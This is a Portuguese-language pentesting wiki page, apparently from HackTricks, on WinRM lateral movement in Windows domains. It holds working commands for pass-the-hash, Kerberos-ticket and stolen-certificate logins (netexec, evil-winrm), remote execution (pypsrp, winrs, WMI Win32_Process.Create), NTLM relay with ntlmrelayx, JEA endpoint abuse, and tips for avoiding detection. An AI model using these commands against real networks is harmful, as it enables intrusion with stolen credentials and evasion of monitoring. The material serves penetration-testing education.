# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM é um dos transportes de **lateral movement** mais convenientes em ambientes Windows porque fornece um shell remoto via **WS-Man/HTTP(S)** sem precisar de truques de criação de serviço SMB. Se o alvo expõe **5985/5986** e seu principal está autorizado a usar remoting, muitas vezes você pode passar de "valid creds" para "interactive shell" muito rapidamente.

Para a **enumeração de protocolo/serviço**, listeners, habilitar WinRM, `Invoke-Command` e uso genérico do client, veja:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Por que operadores gostam de WinRM

- Usa **HTTP/HTTPS** em vez de SMB/RPC, então frequentemente funciona onde a execução no estilo PsExec é bloqueada.
- Com **Kerberos**, evita enviar credenciais reutilizáveis para o alvo.
- Funciona de forma limpa com tooling de **Windows**, **Linux** e **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- O caminho interativo de PowerShell remoting inicia **`wsmprovhost.exe`** no alvo sob o contexto do usuário autenticado, o que é operacionalmente diferente de execução baseada em serviço.

## Modelo de acesso e pré-requisitos

Na prática, lateral movement via WinRM bem-sucedido depende de **três** coisas:

1. O alvo tem um **WinRM listener** (`5985`/`5986`) e regras de firewall que permitem acesso.
2. A conta consegue **autenticar** no endpoint.
3. A conta tem permissão para **abrir uma sessão de remoting**.

Formas comuns de obter esse acesso:

- **Local Administrator** no alvo.
- Associação ao grupo **Remote Management Users** em sistemas mais novos ou **WinRMRemoteWMIUsers__** em sistemas/componentes que ainda respeitam esse grupo.
- Direitos explícitos de remoting delegados por meio de descritores de segurança locais / alterações de ACL do PowerShell remoting.

Se você já controla uma máquina com privilégios de admin, lembre-se de que também pode **delegar acesso ao WinRM sem associação completa ao grupo de admin** usando as técnicas descritas aqui:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Pegadinhas de autenticação que importam durante lateral movement

- **Kerberos exige um hostname/FQDN**. Se você conectar por IP, o client normalmente faz fallback para **NTLM/Negotiate**.
- Em casos de **workgroup** ou de confiança cruzada, NTLM normalmente requer **HTTPS** ou que o alvo seja adicionado a **TrustedHosts** no client.
- Com **local accounts** via Negotiate em um workgroup, restrições remotas do UAC podem impedir o acesso, a menos que a conta Administrator embutida seja usada ou `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting usa por padrão o SPN **`HTTP/<host>`**. Em ambientes onde **`HTTP/<host>`** já está registrado para outra conta de serviço, o Kerberos do WinRM pode falhar com `0x80090322`; use um SPN qualificado por porta ou troque para **`WSMAN/<host>`** onde esse SPN existir.

Se você obtiver credenciais válidas durante password spraying, validá-las via WinRM costuma ser a forma mais rápida de verificar se elas se transformam em um shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement de Linux para Windows

### NetExec / CrackMapExec para validação e execução em uma etapa
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM para shells interativos

`evil-winrm` continua sendo a opção interativa mais conveniente a partir do Linux porque suporta **senhas**, **NT hashes**, **Kerberos tickets**, **client certificates**, transferência de arquivos e carregamento em memória de PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso extremo de Kerberos SPN: `HTTP` vs `WSMAN`

Quando o SPN padrão **`HTTP/<host>`** causar falhas de Kerberos, tente solicitar/usAR um ticket **`WSMAN/<host>`** em vez disso. Isso aparece em setups corporativos endurecidos ou incomuns, onde `HTTP/<host>` já está associado a outra conta de serviço.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Isso também é útil após abuso de **RBCD / S4U** quando você forjou ou solicitou especificamente um ticket de serviço **WSMAN** em vez de um ticket genérico `HTTP`.

### Certificate-based authentication

O WinRM também suporta **client certificate authentication**, mas o certificate precisa ser mapeado no alvo para uma **local account**. Do ponto de vista ofensivo, isso importa quando:

- você roubou/exportou um client certificate válido e a private key já mapeados para WinRM;
- você abusou de **AD CS / Pass-the-Certificate** para obter um certificate para um principal e então fez pivot para outro authentication path;
- você está operando em ambientes que evitam deliberadamente remoting baseado em password.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM é muito menos comum do que autenticação por password/hash/Kerberos, mas, quando existe, pode fornecer um caminho de **lateral movement sem password** que sobrevive à rotação de password.

### Python / automation with `pypsrp`

Se você precisar de automação em vez de um shell de operador, `pypsrp` oferece WinRM/PSRP a partir de Python com suporte a **NTLM**, **certificate auth**, **Kerberos** e **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Se você precisar de controle mais refinado do que o wrapper de alto nível `Client`, as APIs de nível mais baixo `WSMan` + `RunspacePool` são úteis para dois problemas comuns do operador:

- forçar **`WSMAN`** como o serviço/SPN do Kerberos em vez da expectativa padrão `HTTP` usada por muitos clientes PowerShell;
- conectar-se a um **endpoint PSRP não padrão** como uma configuração de sessão **JEA** / custom em vez de `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Endpoints PSRP customizados e JEA importam durante o movimento lateral

Uma autenticação WinRM bem-sucedida **não** significa sempre que você vai cair no endpoint `Microsoft.PowerShell` padrão e sem restrições. Ambientes maduros podem expor **configurações de sessão personalizadas** ou endpoints **JEA** com suas próprias ACLs e comportamento run-as.

Se você já tem execução de código em um host Windows e quer entender quais superfícies de remoting existem, enumere os endpoints registrados:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Quando existir um endpoint útil, aponte-o explicitamente em vez do shell padrão:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Implicações ofensivas práticas:

- Um endpoint **restrito** ainda pode ser suficiente para lateral movement se expuser apenas os cmdlets/funções certos para controle de serviços, acesso a arquivos, criação de processos ou execução arbitrária de .NET / comandos externos.
- Um papel de **JEA mal configurado** é especialmente valioso quando expõe comandos perigosos como `Start-Process`, wildcards amplos, providers graváveis ou funções proxy customizadas que permitem sair das restrições pretendidas.
- Endpoints apoiados por **RunAs virtual accounts** ou **gMSAs** alteram o contexto de segurança efetivo dos comandos que você executa. Em particular, um endpoint apoiado por gMSA pode fornecer **network identity no second hop** mesmo quando uma sessão WinRM normal encontraria o clássico problema de delegation.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` é built in e útil quando você quer **execução nativa de comandos via WinRM** sem abrir uma sessão interativa de PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Duas flags são fáceis de esquecer e importam na prática:

- `/noprofile` muitas vezes é necessário quando o principal remoto **não** é um administrador local.
- `/allowdelegate` permite que o shell remoto use suas credenciais contra um **terceiro host** (por exemplo, quando o comando precisa de `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operacionalmente, `winrs.exe` comumente resulta em uma cadeia de processos remotos semelhante a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Isto vale a pena lembrar porque difere de exec baseado em service e de sessões PSRP interativas.

### `winrm.cmd` / WS-Man COM em vez de PowerShell remoting

Você também pode executar via **WinRM transport** sem `Enter-PSSession`, invocando classes WMI sobre WS-Man. Isso mantém o transport como WinRM enquanto o primitivo de execução remota se torna **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Essa abordagem é útil quando:

- O logging do PowerShell é fortemente monitorado.
- Você quer **WinRM transport** mas não um fluxo clássico de PS remoting.
- Você está criando ou usando tooling customizada em torno do objeto COM **`WSMan.Automation`**.

## NTLM relay para WinRM (WS-Man)

Quando o relay de SMB é bloqueado por signing e o relay de LDAP é restrito, **WS-Man/WinRM** ainda pode ser um alvo de relay atraente. O `ntlmrelayx.py` moderno inclui **WinRM relay servers** e pode fazer relay para alvos **`wsman://`** ou **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Duas notas práticas:

- Relay é mais útil quando o alvo aceita **NTLM** e o principal repassado tem permissão para usar WinRM.
- O código recente do Impacket lida especificamente com requisições **`WSMANIDENTIFY: unauthenticated`**, então probes no estilo `Test-WSMan` não quebram o fluxo do relay.

Para restrições de multi-hop após obter uma primeira sessão WinRM, veja:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Notas de OPSEC e detecção

- **PowerShell remoting** interativo geralmente cria **`wsmprovhost.exe`** no alvo.
- **`winrs.exe`** normalmente cria **`winrshost.exe`** e depois o processo filho solicitado.
- Endpoints **JEA** personalizados podem executar ações como contas virtuais **`WinRM_VA_*`** ou como uma **gMSA** configurada, o que altera tanto a telemetria quanto o comportamento de second-hop em comparação com uma shell normal no contexto de um usuário.
- Espere telemetria de **network logon**, eventos do serviço WinRM e logging operacional/script-block do PowerShell se você usar PSRP em vez de `cmd.exe` bruto.
- Se você só precisar de um único comando, `winrs.exe` ou execução WinRM de uma só vez pode ser mais discreto do que uma sessão remota interativa de longa duração.
- Se Kerberos estiver disponível, prefira **FQDN + Kerberos** em vez de IP + NTLM para reduzir tanto problemas de confiança quanto mudanças incômodas de `TrustedHosts` no lado do cliente.

## Referências

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
